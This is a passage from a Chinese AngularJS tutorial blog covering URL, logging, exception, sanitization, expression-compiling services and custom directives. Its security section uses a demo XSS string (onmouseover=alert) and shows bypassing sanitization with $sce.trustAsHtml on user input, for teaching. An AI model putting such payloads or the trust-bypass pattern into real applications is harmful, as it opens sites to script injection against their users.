Date().toTimeString(); &#125;, 2000); // 省略count和InvokeApply参数，使用默认&#125;); $location服务$location服务增强了原生location属性，提供访问当前URL的入口。它操作第一个#号后面的URL部分，即它不会整体刷新页面，ng在#后重建了完整的URL1http://host.com/app.html#/cities/london?select=hotels#north $location服务提供的一些方法： absUrl() 放回当前文档的完整url，包括第一个#前的部分 hash(target) 获取或设置url的hash部分 host() 返回完整url的主机名称（host.com） path(target) 获取或设置url路径 port() 返回端口号，默认为80 protocol() 返回协议，一般为http replace() 跳转 search(term, params) 获取或设置搜索项 url(target) 或者或设置path、search、hash $locationChangeStart 事件，url被改变前触发，可以用过event对象中的preventDefault阻止改变url $locationChangeSuccess 事件，url被改变后触发 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455&lt;html ng-app=\"exampleApp\"&gt;&lt;head&gt; &lt;title&gt;DOM API Services&lt;/title&gt; &lt;script src=\"angular.js\"&gt;&lt;/script&gt; &lt;link href=\"bootstrap.css\" rel=\"stylesheet\" /&gt; &lt;link href=\"bootstrap-theme.css\" rel=\"stylesheet\" /&gt; &lt;script&gt; angular.module(\"exampleApp\", []) .controller(\"defaultCtrl\", function ($scope, $location) &#123; $scope.$on(\"$locationChangeSuccess\", function (event, newUrl) &#123; $scope.url = newUrl; &#125;); $scope.setUrl = function (component) &#123; switch (component) &#123; case \"reset\": $location.path(\"\"); $location.hash(\"\"); $location.search(\"\"); break; case \"path\": $location.path(\"/cities/london\"); break; case \"hash\": $location.hash(\"north\"); break; case \"search\": $location.search(\"select\", \"hotels\"); break; case \"url\": $location.url(\"/cities/london?select=hotels#north\"); break; &#125; &#125; &#125;); &lt;/script&gt;&lt;/head&gt;&lt;body ng-controller=\"defaultCtrl\"&gt; &lt;div class=\"panel panel-default\"&gt; &lt;h4 class=\"panel-heading\"&gt;URL&lt;/h4&gt; &lt;div class=\"panel-body\"&gt; &lt;p&gt;The URL is: &#123;&#123;url&#125;&#125;&lt;/p&gt; &lt;div class=\"btn-group \"&gt; &lt;button class=\"btn btn-primary\" ng-click=\"setUrl('reset')\"&gt;Reset&lt;/button&gt; &lt;button class=\"btn btn-primary\" ng-click=\"setUrl('path')\"&gt;Path&lt;/button&gt; &lt;button class=\"btn btn-primary\" ng-click=\"setUrl('hash')\"&gt;Hash&lt;/button&gt; &lt;button class=\"btn btn-primary\" ng-click=\"setUrl('search')\"&gt;Search&lt;/button&gt; &lt;button class=\"btn btn-primary\" ng-click=\"setUrl('url')\"&gt;URL&lt;/button&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt;&lt;/body&gt;&lt;/html&gt; HTML5的History API提供了更优雅的方式来处理url，能改变url且页面也不会发生重载，使用$location服务的提供器，$locationProvider启用。123.config(function($locationProvider) &#123; $locationProvider.html5Mode(true);&#125;) 如下是依次点击如下按钮对url的影响： Reset http://host.com/ Path http://host.com/cities/london Hash http://host.com/cities/london#north Search http://host.com/cities/london?select=hotels#north URL http://host.com/cities/london?select=hotels#north 但是History API在各浏览器中的实现不一致，同时旧浏览器不支持，所以需要在用之前测试12345.config(function ($locationProvider) &#123; if (window.history &amp;&amp; history.pushState) &#123; $locationProvider.html5Mode(true); &#125;&#125;) $anchorScroll服务滚动浏览器窗口到显示id与$location.hash一致的元素处,同时通过服务提供器禁用这个功能123456789101112131415161718192021222324252627282930313233343536373839404142434445464748&lt;html ng-app=\"exampleApp\"&gt;&lt;head&gt; &lt;title&gt;DOM API Services&lt;/title&gt; &lt;script src=\"angular.js\"&gt;&lt;/script&gt; &lt;link href=\"bootstrap.css\" rel=\"stylesheet\" /&gt; &lt;link href=\"bootstrap-theme.css\" rel=\"stylesheet\" /&gt; &lt;script&gt; angular.module(\"exampleApp\", []) .config(function ($anchorScrollProvider) &#123; $anchorScrollProvider.disableAutoScrolling(); &#125;) .controller(\"defaultCtrl\", function ($scope, $location, $anchorScroll) &#123; $scope.itemCount = 50; $scope.items = []; for (var i = 0; i &lt; $scope.itemCount; i++) &#123; $scope.items[i] = \"Item \" + i; &#125; $scope.show = function(id) &#123; $location.hash(id); if (id == \"bottom\") &#123; $anchorScroll(); &#125; &#125; &#125;); &lt;/script&gt;&lt;/head&gt;&lt;body ng-controller=\"defaultCtrl\"&gt; &lt;div class=\"panel panel-default\"&gt; &lt;h4 class=\"panel-heading\"&gt;URL&lt;/h4&gt; &lt;div class=\"panel-body\"&gt; &lt;p id=\"top\"&gt;This is the top&lt;/p&gt; &lt;button class=\"btn btn-primary\" ng-click=\"show('bottom')\"&gt; Go to Bottom&lt;/button&gt; &lt;p&gt; &lt;ul&gt; &lt;li ng-repeat=\"item in items\"&gt;&#123;&#123;item&#125;&#125;&lt;/li&gt; &lt;/ul&gt; &lt;/p&gt; &lt;p id=\"bottom\"&gt;This is the bottom&lt;/p&gt; &lt;button class=\"btn btn-primary\" ng-click=\"show('top')\"&gt;Go to Top&lt;/button&gt; &lt;/div&gt; &lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 当show的参数为bottom时，调用$anchorScroll服务，否则不调用。具体表现为：浏览器能在单击Go to Bottom按钮时滚动到底部，但是单击Go to Top按钮时不滚动到顶部。 $log服务ng提供的$log服务是对全局console对象的封装，它能使单元测试更容易,下面的代码将$log用于使用工厂方法定义的服务123456789angular.module(\"customServices\", []) .factory(\"logService\", function ($log) &#123; var messageCount = 0; return &#123; log: function (msg) &#123; $log.log(\"(LOG + \" + this.messageCount++ + \") \" + msg); &#125; &#125;; &#125;); $log服务的默认行为不是调用debug方法到控制台，可通过设置$logProvider.debugEnabled属性为true启用调试。 异常ng使用$exceptionHandler服务处理应用出现的异常，默认的实现是调用$log服务定义的error方法，在其中调用全局console.error方法。异常分为两大类，第一类是在编码和测试期间产生的，这个是自然开发周期的一部分，能够帮助应用开发，使其更健壮。第二类是应用发布之后公众看到的。处理异常的方法不同，但捕获这些异常是应该的，因为这样可以响应异常，并为未来的分析做记录。这就是为什么需要$exceptionHandler服务出现的原因。$exceptionHandler服务仅处理未捕获的异常，使用js原生的try…catch捕获的异常将不会被服务处理。1234567891011121314151617181920212223&lt;html ng-app=\"exampleApp\"&gt;&lt;head&gt; &lt;title&gt;Exceptions&lt;/title&gt; &lt;script src=\"angular.js\"&gt;&lt;/script&gt; &lt;link href=\"bootstrap.css\" rel=\"stylesheet\" /&gt; &lt;link href=\"bootstrap-theme.css\" rel=\"stylesheet\" /&gt; &lt;script&gt; angular.module(\"exampleApp\", []) .controller(\"defaultCtrl\", function ($scope) &#123; $scope.throwEx = function () &#123; throw new Error(\"Triggered Exception\"); &#125; &#125;); &lt;/script&gt;&lt;/head&gt;&lt;body ng-controller=\"defaultCtrl\"&gt; &lt;div class=\"panel panel-default\"&gt; &lt;div class=\"panel-body\"&gt; &lt;button class=\"btn btn-primary\" ng-click=\"throwEx()\"&gt;Throw Exception&lt;/button&gt; &lt;/div&gt; &lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 点击Throw Exception按钮后能在控制台看到报错信息，并能看到一堆的记录。 也可以显式使用$exceptionHandler服务，该服务对象有两个参数，异常和用于描述异常的原因的可选字符串。123456789.controller(\"defaultCtrl\", function ($scope, $exceptionHandler) &#123; $scope.throwEx = function () &#123; try &#123; throw new Error(\"Triggered Exception\"); &#125; catch (ex) &#123; $exceptionHandler(ex.message, \"Button Click\"); &#125; &#125;&#125;); 还可以自定义服务来覆盖ng默认的异常处理服务，这样做能更好的格式化异常以及显示，但是需慎重，因为异常处理的代码需要经过严格测试，无懈可击，否则会让代码难以调试和维护。123456789101112131415angular.module(\"exampleApp\", []).controller(\"defaultCtrl\", function ($scope, $exceptionHandler) &#123; $scope.throwEx = function () &#123; try &#123; throw new Error(\"Triggered Exception\"); &#125; catch (ex) &#123; $exceptionHandler(ex, \"Button Click\"); &#125; &#125;&#125;).factory(\"$exceptionHandler\", function ($log) &#123; return function (exception, cause) &#123; $log.error(\"Message: \" + exception.message + \" (Cause: \" + cause + \")\"); &#125;&#125;); 处理危险数据在Web安全中，常见的攻击手段为xss（跨站脚本注入）和csrf(跨域请求伪造)，这些攻击手段将恶意内容通过表单注入到应用中，而这些危险内容会回显给其他浏览该恶意代码页面的用户，以达到攻击目的。ng内置一些安全服务处理这些危险数据，降低风险，如sce(strict contextual escaping, 移除危险元素和属性), sanitize（替换危险字符并转义）。sce服务是默认开启的，预防不安全的值通过数据绑定被展示到页面上。123456789101112131415161718192021&lt;html ng-app=\"exampleApp\"&gt;&lt;head&gt; &lt;title&gt;SCE&lt;/title&gt; &lt;script src=\"angular.js\"&gt;&lt;/script&gt; &lt;link href=\"bootstrap.css\" rel=\"stylesheet\" /&gt; &lt;link href=\"bootstrap-theme.css\" rel=\"stylesheet\" /&gt; &lt;script&gt; angular.module(\"exampleApp\", []) .controller(\"defaultCtrl\", function ($scope) &#123; $scope.htmlData = \"&lt;p&gt;This is &lt;b onmouseover=alert('Attack!')&gt;dangerous&lt;/b&gt; data&lt;/p&gt;\"; &#125;); &lt;/script&gt;&lt;/head&gt;&lt;body ng-controller=\"defaultCtrl\"&gt; &lt;div class=\"well\"&gt; &lt;p&gt;&lt;input class=\"form-control\" ng-model=\"htmlData\" /&gt;&lt;/p&gt; &lt;p&gt;&#123;&#123;htmlData&#125;&#125;&lt;/p&gt; &lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 上述代码就是在一个输入框获取输入并显示到界面，若成功，则会在鼠标移到dangerous字符上时弹出提示框，但由于sce，ng将危险的字符（HTML中的&lt;和&gt;字符）转义替换，所以直接显示了代码并且其中的交互和js脚本无法执行。 有的时候需求中确实需要显示执行一些代码或者交互，此时可使用ng-bind-html指令，它信任所指定的数据，所以不会转义左右尖括号而直接显示，ng-bind-html指令依赖ngSanitize模块，可能需要独立下载这个模块并提前载入。 12345678910111213141516171819202122&lt;html ng-app=\"exampleApp\"&gt;&lt;head&gt; &lt;title&gt;SCE&lt;/title&gt; &lt;script src=\"angular.js\"&gt;&lt;/script&gt; &lt;script src=\"angular-sanitize.js\"&gt;&lt;/script&gt; &lt;link href=\"bootstrap.css\" rel=\"stylesheet\" /&gt; &lt;link href=\"bootstrap-theme.css\" rel=\"stylesheet\" /&gt; &lt;script&gt; angular.module(\"exampleApp\", [\"ngSanitize\"]) .controller(\"defaultCtrl\", function ($scope) &#123; $scope.htmlData = \"&lt;p&gt;This is &lt;b onmouseover=alert('Attack!')&gt;dangerous&lt;/b&gt; data&lt;/p&gt;\"; &#125;); &lt;/script&gt;&lt;/head&gt;&lt;body ng-controller=\"defaultCtrl\"&gt; &lt;div class=\"well\"&gt; &lt;p&gt;&lt;input class=\"form-control\" ng-model=\"htmlData\" /&gt;&lt;/p&gt; &lt;p ng-bind-html=\"htmlData\"&gt;&lt;/p&gt; &lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 代码运行如上图，但却发现onmouseover没能起作用，打开控制台，发现html代码中的onmouseover=alert(&#39;Attack!&#39;)被移除了。其实是因为ngSanitize模块的$sanitize服务被默认用于ng-bind-html指令，这个服务能提出script和css元素、内联js事件处理器和样式属性以及可能造成问题的任何字符（即sanitize净化）。 $sanitize服务也可以被显式使用，净化数据。1234567891011121314151617181920212223242526&lt;html ng-app=\"exampleApp\"&gt;&lt;head&gt; &lt;title&gt;SCE&lt;/title&gt; &lt;script src=\"angular.js\"&gt;&lt;/script&gt; &lt;script src=\"angular-sanitize.js\"&gt;&lt;/script&gt; &lt;link href=\"bootstrap.css\" rel=\"stylesheet\" /&gt; &lt;link href=\"bootstrap-theme.css\" rel=\"stylesheet\" /&gt; &lt;script&gt; angular.module(\"exampleApp\", [\"ngSanitize\"]) .controller(\"defaultCtrl\", function ($scope, $sanitize) &#123; $scope.dangerousData = \"&lt;p&gt;This is &lt;b onmouseover=alert('Attack!')&gt;dangerous&lt;/b&gt; data&lt;/p&gt;\"; $scope.$watch(\"dangerousData\", function (newValue) &#123; $scope.htmlData = $sanitize(newValue); &#125;); &#125;); &lt;/script&gt;&lt;/head&gt;&lt;body ng-controller=\"defaultCtrl\"&gt; &lt;div class=\"well\"&gt; &lt;p&gt;&lt;input class=\"form-control\" ng-model=\"dangerousData\" /&gt;&lt;/p&gt; &lt;p ng-bind=\"htmlData\"&gt;&lt;/p&gt; &lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 上述代码在input元素上绑定ng-model指令，在控制器中用监听器监听绑定属性改变，当有新值时使用$sanitize服务净化对象，剔除事件处理器，但ng-bind仍然会转义危险的左右尖括号。效果如下， 在极少的情况下，可能需要显示原始数据（不转义，不净化），此时使用$sce服务的trustAsHtml方法指定内容可信，同时使用ng-bind-html防止被ng默认转义。1234567891011121314151617181920212223242526&lt;html ng-app=\"exampleApp\"&gt;&lt;head&gt; &lt;title&gt;SCE&lt;/title&gt; &lt;script src=\"angular.js\"&gt;&lt;/script&gt; &lt;script src=\"angular-sanitize.js\"&gt;&lt;/script&gt; &lt;link href=\"bootstrap.css\" rel=\"stylesheet\" /&gt; &lt;link href=\"bootstrap-theme.css\" rel=\"stylesheet\" /&gt; &lt;script&gt; angular.module(\"exampleApp\", [\"ngSanitize\"]) .controller(\"defaultCtrl\", function ($scope, $sce) &#123; $scope.htmlData = \"&lt;p&gt;This is &lt;b onmouseover=alert('Attack!')&gt;dangerous&lt;/b&gt; data&lt;/p&gt;\"; $scope.$watch(\"htmlData\", function (newValue) &#123; $scope.trustedData = $sce.trustAsHtml(newValue); &#125;); &#125;); &lt;/script&gt;&lt;/head&gt;&lt;body ng-controller=\"defaultCtrl\"&gt; &lt;div class=\"well\"&gt; &lt;p&gt;&lt;input class=\"form-control\" ng-model=\"htmlData\" /&gt;&lt;/p&gt; &lt;p ng-bind-html=\"trustedData\"&gt;&lt;/p&gt; &lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 表达式和指令ng提供了一些用于处理内容和绑定表达式的服务，这些服务将内容处理为函数，包括简单表达式，html片段，绑定和指令 $compile 将包含绑定和指令的html片段转换为被调用的函数生成内容 $interpolate 将包含内联绑定的字符串转换为能被调用的函数生成内容 $parse 将ng表达式转换为能被调用的函数生成内容上述服务的目的在于控制用于生成和显示内容的过程，在基础指令中不需要使用这些服务，但当需要精确管理模版时，他们就非常有用了。 表达式转函数$parse服务传入ng表达式，并转换表达式为函数，然后使用该函数求得表达式的值（具体的值与其所处的作用域有关）1234567891011121314151617181920212223242526272829303132333435363738&lt;html ng-app=\"exampleApp\"&gt;&lt;head&gt; &lt;title&gt;Expressions&lt;/title&gt; &lt;script src=\"angular.js\"&gt;&lt;/script&gt; &lt;link href=\"bootstrap.css\" rel=\"stylesheet\" /&gt; &lt;link href=\"bootstrap-theme.css\" rel=\"stylesheet\" /&gt; &lt;script&gt; angular.module(\"exampleApp\", []) .controller(\"defaultCtrl\", function ($scope) &#123; $scope.price = \"100.23\"; &#125;) .directive(\"evalExpression\", function ($parse) &#123; return function(scope, element, attrs) &#123; scope.$watch(attrs[\"evalExpression\"], function (newValue) &#123; try &#123; var expressionFn = $parse(scope.expr); var result = expressionFn(scope); if (result == undefined) &#123; result = \"No result\"; &#125; &#125; catch (err) &#123; result = \"Cannot evaluate expression\"; &#125; element.text(result); &#125;); &#125; &#125;); &lt;/script&gt;&lt;/head&gt;&lt;body ng-controller=\"defaultCtrl\"&gt; &lt;div class=\"well\"&gt; &lt;p&gt;&lt;input class=\"form-control\" ng-model=\"expr\" /&gt;&lt;/p&gt; &lt;div&gt; Result: &lt;span eval-expression=\"expr\"&gt;&lt;/span&gt; &lt;/div&gt; &lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 上述示例创建了叫evalExpression的指令，在span元素上应用指令并使用expr属性配置，当绑定的expr值为一个ng表达式时，将表达式的结果计算并显示在span文本中。其中$parse服务的使用很简单，它是一个函数，参数是被求值的表达式，但$parse服务不计算表达式本身，它是一个工厂函数，返回实际执行工作的工人函数的工厂函数, 而返回的结果也是一个函数，此时将作用域传入该返回函数即可计算表达式字符串了。12var expressionFn = $parse(scope.expr);var result = expressionFn(scope); 也可以使用本地数据给表达式转换后的函数：12345678910111213141516171819202122232425262728293031323334353637383940&lt;html ng-app=\"exampleApp\"&gt;&lt;head&gt; &lt;title&gt;Expressions&lt;/title&gt; &lt;script src=\"angular.js\"&gt;&lt;/script&gt; &lt;link href=\"bootstrap.css\" rel=\"stylesheet\" /&gt; &lt;link href=\"bootstrap-theme.css\" rel=\"stylesheet\" /&gt; &lt;script&gt; angular.module(\"exampleApp\", []) .controller(\"defaultCtrl\", function ($scope) &#123; $scope.dataValue = \"100.23\"; &#125;) .directive(\"evalExpression\", function ($parse) &#123; var expressionFn = $parse(\"total | currency\"); return &#123; scope: &#123; amount: \"=amount\", tax: \"=tax\" &#125;, link: function (scope, element, attrs) &#123; scope.$watch(\"amount\", function (newValue) &#123; var localData = &#123; total: Number(newValue) + (Number(newValue) * (Number(scope.tax) /100)) &#125; element.text(expressionFn(scope, localData)); &#125;); &#125; &#125; &#125;); &lt;/script&gt;&lt;/head&gt;&lt;body ng-controller=\"defaultCtrl\"&gt; &lt;div class=\"well\"&gt; &lt;p&gt;&lt;input class=\"form-control\" ng-model=\"dataValue\" /&gt;&lt;/p&gt; &lt;div&gt; Result: &lt;span eval-expression amount=\"dataValue\" tax=\"10\"&gt;&lt;/span&gt; &lt;/div&gt; &lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 上例默认为：Result: $110.25 插入字符串$interpolate服务和它的提供器$interpolateProvider，用于配置ng执行内插的方式，将表达式插入字符串的过程，$interpolate服务比$parse更灵活，它能和包含表达式的字符串一起工作，而不仅仅是表达式。1234567891011121314151617181920212223242526272829303132333435363738394041&lt;html ng-app=\"exampleApp\"&gt;&lt;head&gt; &lt;title&gt;Expressions&lt;/title&gt; &lt;script src=\"angular.js\"&gt;&lt;/script&gt; &lt;link href=\"bootstrap.css\" rel=\"stylesheet\" /&gt; &lt;link href=\"bootstrap-theme.css\" rel=\"stylesheet\" /&gt; &lt;script&gt; angular.module(\"exampleApp\", []) .controller(\"defaultCtrl\", function ($scope) &#123; $scope.dataValue = \"100.23\"; &#125;) .directive(\"evalExpression\", function ($interpolate) &#123; var interpolationFn = $interpolate(\"The total is: &#123;&#123;amount | currency&#125;&#125; (including tax)\"); return &#123; scope: &#123; amount: \"=amount\", tax: \"=tax\" &#125;, link: function (scope, element, attrs) &#123; scope.$watch(\"amount\", function (newValue) &#123; var localData = &#123; total: Number(newValue) + (Number(newValue) * (Number(scope.tax) /100)) &#125; element.text(interpolationFn(scope)); &#125;); &#125; &#125; &#125;); &lt;/script&gt;&lt;/head&gt;&lt;body ng-controller=\"defaultCtrl\"&gt; &lt;div class=\"well\"&gt; &lt;p&gt;&lt;input class=\"form-control\" ng-model=\"dataValue\" /&gt;&lt;/p&gt; &lt;div&gt; &lt;span eval-expression amount=\"dataValue\" tax=\"10\"&gt;&lt;/span&gt; &lt;/div&gt; &lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 使用$interpolate服务比使用$parse简单，但有明显的差异，最明显的是$interpolate服务能操作非ng内容和内联绑定混合的字符串。第二个不同的就是，无法提供作用域和本地数据给$interpolate服务创建的内插函数，因为必须确保白哦大师所需的数值被包含在传入内插函数的对象中。1&#123;&#123; &#125;&#125; //这两个表示内联绑定的字符，双写大括号，称为内插字符 内插字符能够通过$interpolate服务的提供器$interpolateProvider改变， startSymbol(symbol) 替换起始字符，默认为双写{ endSymbol(symbol) 替换结束字符，默认为双写}12345678910angular.module(\"exampleApp\", []).config(function($interpolateProvider) &#123; $interpolateProvider.startSymbol(\"!!\"); $interpolateProvider.endSymbol(\"!!\");&#125;)// 指令中使用var interpolationFn = $interpolate(\"The total is: !!amount | currency!! (including tax)\");// html中绑定&lt;p&gt;Original amount: !!dataValue!!&lt;/p&gt; 编译内容$compile服务处理包含绑定与表达式的html片段，它能创建可利用作用域生成内容的函数，相当于$parse和$interpolate，但不支持指令。使用$compile服务比其他服务要复杂一些。12345678910111213141516171819202122232425262728&lt;html ng-app=\"exampleApp\"&gt;&lt;head&gt; &lt;title&gt;Expressions&lt;/title&gt; &lt;script src=\"angular.js\"&gt;&lt;/script&gt; &lt;link href=\"bootstrap.css\" rel=\"stylesheet\" /&gt; &lt;link href=\"bootstrap-theme.css\" rel=\"stylesheet\" /&gt; &lt;script&gt; angular.module(\"exampleApp\", []) .controller(\"defaultCtrl\", function ($scope) &#123; $scope.cities = [\"London\", \"Paris\", \"New York\"]; &#125;) .directive(\"evalExpression\", function($compile) &#123; return function (scope, element, attrs) &#123; var content = \"&lt;ul&gt;&lt;li ng-repeat='city in cities'&gt;&#123;&#123;city&#125;&#125;&lt;/li&gt;&lt;/ul&gt;\" var listElem = angular.element(content); var compileFn = $compile(listElem); compileFn(scope); element.append(listElem); &#125; &#125;); &lt;/script&gt;&lt;/head&gt;&lt;body ng-controller=\"defaultCtrl\"&gt; &lt;div class=\"well\"&gt; &lt;span eval-expression&gt;&lt;/span&gt; &lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 指令使用$compile服务处理html片段，该片段使用ng-repeat指令并和城市数据一起填入ul中，注意comileFn(scope)并没有返回值，而是在原来的listElem上计算并更新，然后直接将元素添加到DOM中即可。","categories":[{"name":"angularjs","slug":"angularjs","permalink":"https://github.com/xmoyKING/categories/angularjs/"}],"tags":[{"name":"angularjs","slug":"angularjs","permalink":"https://github.com/xmoyKING/tags/angularjs/"}]},{"title":"angularjs入门笔记-17-自定义指令1","slug":"angularjs17","date":"2017-05-27T03:42:50.000Z","updated":"2017-12-06T14:50:08.868Z","comments":true,"path":"2017/05/27/angularjs17/","link":"","permalink":"https://github.com/xmoyKING/2017/05/27/angularjs17/","excerpt":"","text":"当内置指令无法满足需求时，就可以创建自定义指令，尤其是在需要能够用于多个ng程序的子包含的功能单元时。 使用Module.directive方法创建指令，参数为指令名和一个工厂函数。 要注意指令名是驼峰式命名unorderedList，而使用的时候是连字符的形式unordered-list：123456angular.module(\"exampleApp\", []) .directive(\"unorderedList\", function () &#123; return function (scope, element, attrs) &#123; // implementation code will go here &#125; &#125;) 作为属性使用：1&lt;div unordered-list=\"products\"&gt;&lt;/div&gt; 链接函数指令中工厂函数返回的工人函数即链接函数，它的作用是提供一些方法，这些方法将指令和html文档以及作用域连接起来。（实际上还有一个与指令相关联的函数叫编译函数） 当ng建立指令的实例时（指令的工厂函数其实是一个构造器，或说类模板，能够生成类的实例），链接函数被自动调用，同时传入三个参数，分别是：视图作用域、指令应用的html元素、以及html元素的属性，一般使用scope、element、attrs三个形参名来接收（注意scope没有$前缀，他们只是普通的js参数，不是通过依赖注入的，即参数的顺序是固定传入的）。 从作用域中获取数据的方式：从attrs集合中使用unorderedList作为key，然后传给scope对象获取作用域中的数据1var data = scope[attrs[\"unorderedList\"]]; 生成html元素：element参数其实是一个剪裁后jquery对象，ng称为jqLite，也可以通过angularjs.element获取这个jqLite对象。12345678910function (scope, element, attrs) &#123; var data = scope[attrs[\"unorderedList\"]]; if (angular.isArray(data)) &#123; var listElem = angular.element(\"&lt;ul&gt;\"); element.append(listElem); for (var i = 0; i &lt; data.length; i++) &#123; listElem.append(angular.element('&lt;li&gt;').text(data[i].name)); &#125; &#125;&#125; 上例的结果就是，在html元素上根据作用域中的数据生成一个列表。 也可以在属性值中使用表达式，通过scope.$eval方法来计算。1&lt;div unordered-list=\"products\" list-property=\"price | currency\"&gt;&lt;/div&gt; 123456789101112131415.directive(\"unorderedList\", function () &#123; return function (scope, element, attrs) &#123; var data = scope[attrs[\"unorderedList\"]]; var propertyExpression = attrs[\"listProperty\"]; if (angular.isArray(data)) &#123; var listElem = angular.element(\"&lt;ul&gt;\"); element.append(listElem); for (var i = 0; i &lt; data.length; i++) &#123; listElem.append(angular.element('&lt;li&gt;') .text(scope.$eval(propertyExpression, data[i]))); &#125; &#125; &#125;&#125;) 处理数据变化，可以通过$eval将表达式的值计算出来，然后通过jqLite写入html元素，但是却无法像内置指令那样在作用域数据变化时同步更新属性值表达式内的值。 要处理数据变化， 需要用到$watch方法来监控作用域中数据的变化，每当有变化时，就使用eval计算，然后再次通过jqLite写入到html中12345678910for (var i = 0; i &lt; data.length; i++) &#123; var itemElement = angular.element('&lt;li&gt;'); listElem.append(itemElement); var watcherFn = function (watchScope) &#123; return watchScope.$eval(propertyExpression, data[i]); &#125; scope.$watch(watcherFn, function (newValue, oldValue) &#123; itemElement.text(newValue); &#125;);&#125; 上述会产生闭包的问题，导致i的值越界。解决方法为使用IIFE,立即执行表达式，将i的值在当前循环时即确定传给$eval方法：12345678910111213for (var i = 0; i &lt; data.length; i++) &#123; (function () &#123; var itemElement = angular.element('&lt;li&gt;'); listElem.append(itemElement); var index = i; var watcherFn = function (watchScope) &#123; return watchScope.$eval(propertyExpression, data[index]); &#125; scope.$watch(watcherFn, function (newValue, oldValue) &#123; itemElement.text(newValue); &#125;); &#125;());&#125; jqLite对DOM的支持与jquery有些许区别，比如children、eq、find、next、parent这几个命令。 attr和prop方法的区别：prop方法处理的是被DOM API HTMLElement对象所定义的属性，而不是标记语言HTML元素定义的，通常是一样的，但是有一些属性是不一样的，比如class，它在HTMLElement对象中是用className驼峰式表示的。 使用选项自定义指令ng提供了许多选项帮助开发，它们能够更加方便快捷的帮助开发复杂应用。 restrict属性指定指令的使用方式 template属性将内容使用HTML模版，而不是jqLite生成html元素 templateUrl属性指定外部模版文件地址 replace属性指定模版内容是否替换指令所在元素 scope属性为true时为指令的每一个实例都创建一个隔离作用域 在隔离作用域能阻止指令继承父作用域 @前缀表示在隔离作用域中创建一个单项绑定 =前缀表示在隔离作用域中创建一个双向绑定 &amp;前缀表示在父作用域的上下文中计算一个表达式 link属性指定链接函数 compile属性指定编译函数 transclude属性指定是否用于包含任意内容 ng默认情况下是将创建的指令当做属性使用，即restrict默认为A，表示属性.restrict可以设置四种值：E A C M, 也可以单独使用，也可以混合使用: E 将指令作为元素使用 A 将指令作为属性使用 C 将指令作为css类使用 M 将指令作为html注释使用 12345678910111213141516171819202122.directive(\"unorderedList\", function () &#123; return &#123; link: function (scope, element, attrs) &#123; var data = scope[attrs[\"unorderedList\"] || attrs[\"listSource\"]]; var propertyExpression = attrs[\"listProperty\"] || \"price | currency\"; if (angular.isArray(data)) &#123; var listElem = angular.element(\"&lt;ul&gt;\"); if (element[0].nodeName == \"#comment\") &#123; element.parent().append(listElem); &#125; else &#123; element.append(listElem); &#125; for (var i = 0; i &lt; data.length; i++) &#123; var itemElement = angular.element(\"&lt;li&gt;\") .text(scope.$eval(propertyExpression, data[i])); listElem.append(itemElement); &#125; &#125; &#125;, restrict: \"EACM\" &#125;&#125; 实际使用时，C和M的使用比较少见，一般是AE单独/混合使用。 当做元素使用：1&lt;unordered-list list-source=\"products\" list-property=\"price | currency\" /&gt; 当做css类的属性值使用：1&lt;div class=\"unordered-list: products\" list-property=\"price | currency\"&gt;&lt;/div&gt; 当做注释使用：1&lt;!-- directive: unordered-list products --&gt; 在CM的情况下，若属性值比较多，还需要完成属性值的解析，同时需要修改link函数，以检查属性值及其数据来源。 link函数和compile函数区别compile指定的编译函数应该只用于修改DOM，而link指定的链接函数只设置监听器或事件处理。编译/链接分离有助于改善复杂指令的性能，但在项目中，一般只是用链接函数，因为编译函数只用来创建类似ng-repeat指令这样的功能。 使用template模版当使用template时，链接函数不需要负责生成展示数据的html元素了，而仅仅只需要将作用域内的数据准备好，完成监听器并将事件绑定做好即可。而模版负责生成html元素。 123456789101112131415161718192021222324252627282930313233343536373839&lt;html ng-app=\"exampleApp\"&gt;&lt;head&gt; &lt;title&gt;Directives&lt;/title&gt; &lt;script src=\"angular.js\"&gt;&lt;/script&gt; &lt;link href=\"bootstrap.css\" rel=\"stylesheet\" /&gt; &lt;link href=\"bootstrap-theme.css\" rel=\"stylesheet\" /&gt; &lt;script&gt; angular.module(\"exampleApp\", []) .directive(\"unorderedList\", function () &#123; return &#123; link: function (scope, element, attrs) &#123; scope.data = scope[attrs[\"unorderedList\"]]; &#125;, restrict: \"A\", template: \"&lt;ul&gt;&lt;li ng-repeat='item in data'&gt;\" + \"&#123;&#123;item.price | currency&#125;&#125;&lt;/li&gt;&lt;/ul&gt;\" &#125; &#125;).controller(\"defaultCtrl\", function ($scope) &#123; $scope.products = [ &#123; name: \"Apples\", category: \"Fruit\", price: 1.20, expiry: 10 &#125;, &#123; name: \"Bananas\", category: \"Fruit\", price: 2.42, expiry: 7 &#125;, &#123; name: \"Pears\", category: \"Fruit\", price: 2.02, expiry: 6 &#125; ]; &#125;) &lt;/script&gt;&lt;/head&gt;&lt;body ng-controller=\"defaultCtrl\"&gt; &lt;div class=\"panel panel-default\"&gt; &lt;div class=\"panel-heading\"&gt; &lt;h3&gt;Products&lt;/h3&gt; &lt;/div&gt; &lt;div class=\"panel-body\"&gt; &lt;div unordered-list=\"products\"&gt; This is where the list will go &lt;/div&gt; &lt;/div&gt; &lt;/div&gt;&lt;/body&gt;&lt;/html&gt; template也可以指定一个函数来表示生成模版，该函数调用时会被传入两个参数（分别表示html元素和其属性集合），同时该函数需要返回一个插入到文档中的html代码片段。 1234567891011121314151617181920212223242526&lt;script type=\"text/template\" id=\"listTemplate\"&gt; &lt;ul&gt; &lt;li ng-repeat=\"item in data\"&gt;&#123;&#123;item.price | currency&#125;&#125;&lt;/li&gt; &lt;/ul&gt;&lt;/script&gt;&lt;script&gt; angular.module(\"exampleApp\", []) .directive(\"unorderedList\", function () &#123; return &#123; link: function (scope, element, attrs) &#123; scope.data = scope[attrs[\"unorderedList\"]]; &#125;, restrict: \"A\", template: function () &#123; return angular.element( document.querySelector(\"#listTemplate\")).html(); &#125; &#125; &#125;).controller(\"defaultCtrl\", function ($scope) &#123; $scope.products = [ &#123; name: \"Apples\", category: \"Fruit\", price: 1.20, 